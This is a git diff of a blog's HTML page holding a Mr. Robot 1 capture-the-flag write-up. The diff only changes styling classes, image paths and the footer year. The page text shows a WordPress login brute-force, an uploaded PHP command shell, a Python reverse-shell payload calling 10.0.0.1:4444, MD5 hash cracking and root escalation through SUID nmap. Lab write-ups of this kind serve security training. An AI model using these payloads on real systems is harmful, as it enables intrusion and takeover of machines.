@@ -106,7 +106,7 @@
 
 <p>I ran nmap:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sT -sV -Pn 192.168.1.17
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sT -sV -Pn 192.168.1.17
 </code></pre></div></div>
 
 <ul>
@@ -115,7 +115,7 @@
   <li>-Pn: skip host discovery (I had problems with ICMP echo request packets)</li>
 </ul>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-10-22 18:40 CEST
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-10-22 18:40 CEST
 Nmap scan report for linux.homenet.telecomitalia.it (192.168.1.17)
 Host is up (0.0014s latency).
 Not shown: 997 filtered ports
@@ -129,39 +129,39 @@ PORT STATE SERVICE VERSION
 
 <p>The website was the same on port 80 and 443:</p>
 
-<p><img src="/images/posts/2016/2016-12-21-mr-robot-1-writeup/img1.png" alt="Screenshot" /></p>
+<p><img src="/images/2016-12-21-mr-robot-1-writeup/img1.png" alt="Screenshot" /></p>
 
 <p>It was an animated console on a fsociety machine 😛</p>
 
 <p>But… look at this:</p>
 
-<p><img src="/images/posts/2016/2016-12-21-mr-robot-1-writeup/img2.png" alt="Screenshot" /></p>
+<p><img src="/images/2016-12-21-mr-robot-1-writeup/img2.png" alt="Screenshot" /></p>
 
 <p>First Key :</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>073403c8a58a1f80d943455fb30724b9
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>073403c8a58a1f80d943455fb30724b9
 </code></pre></div></div>
 
 <p>There was a wordpress blog on the website. I tried to enumerate users with wpscan, but it didn’t work. After some attempts, I found that ‘eliot’ was a valid username. I ran wpscan to bruteforce the wordpress login for user ‘eliot’ with the dictionary file ‘fsocity.dic’. The password was:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ER28–0652
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ER28–0652
 </code></pre></div></div>
 
 <p>After logged in, I uploaded a php shell:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php passthru($_GET[“cmd”]); ?&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php passthru($_GET[“cmd”]); ?&gt;
 </code></pre></div></div>
 
-<p><img src="/images/posts/2016/2016-12-21-mr-robot-1-writeup/img3.png" alt="Screenshot" /></p>
+<p><img src="/images/2016-12-21-mr-robot-1-writeup/img3.png" alt="Screenshot" /></p>
 
 <p>I got a reverse shell on netcat by using this payload:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.1.17/wp-content/uploads/2016/10/shell.php?cmd=python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket. SOCK_STREAM);s.connect((“10.0.0.1”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.1.17/wp-content/uploads/2016/10/shell.php?cmd=python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket. SOCK_STREAM);s.connect((“10.0.0.1”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
 </code></pre></div></div>
 
 <p>I spawned a TTY shell:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/sh: 0: can’t access tty; job control turned off
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/sh: 0: can’t access tty; job control turned off
 $ id
 uid=1(daemon) gid=1(daemon) groups=1(daemon)
 $ python -c “import pty;pty.spawn(‘/bin/bash’);”
@@ -170,7 +170,7 @@ daemon@linux:/opt/bitnami/apps/wordpress/htdocs/wp-content/uploads/2016/10$
 
 <p>Ok I found this:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daemon@linux:/home/robot$ ls -l
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daemon@linux:/home/robot$ ls -l
 ls -l
 total 8
 -r——– 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
@@ -179,12 +179,12 @@ total 8
 
 <p>I didn’t have permission to read the second key but I found something in the password.raw-md5 file:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:c3fcd3d76192e4007dfb496cca67e13b
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:c3fcd3d76192e4007dfb496cca67e13b
 </code></pre></div></div>
 
 <p>I used Crack Station and I got the second key:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:abcdefghijklmnopqrstuvwxyz
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:abcdefghijklmnopqrstuvwxyz
 
 daemon@linux:/home/robot$ su – robot
 su – robot
@@ -199,7 +199,7 @@ cat key-2-of-3.txt
 
 <p>After some local enumeration, I found nmap with SUID set to root on the system. This <a href="http://www.exploit-db.com/papers/18168/">paper</a> explains how to get a root shell:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>robot@linux:/usr/local/bin$ ls -l
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>robot@linux:/usr/local/bin$ ls -l
 ls -l
 total 496
 -rwsr-xr-x 1 root root 504736 Nov 13  2015 nmap
@@ -262,7 +262,7 @@ nmap&gt; ! cat /root/key-3-of-3.txt
         <div class="row">
   <div class="col-lg-8 col-lg-offset-2">
     <footer>
-      Syrion © 2018 
+      Syrion © 2020 
     </footer>
   </div>
 </div>
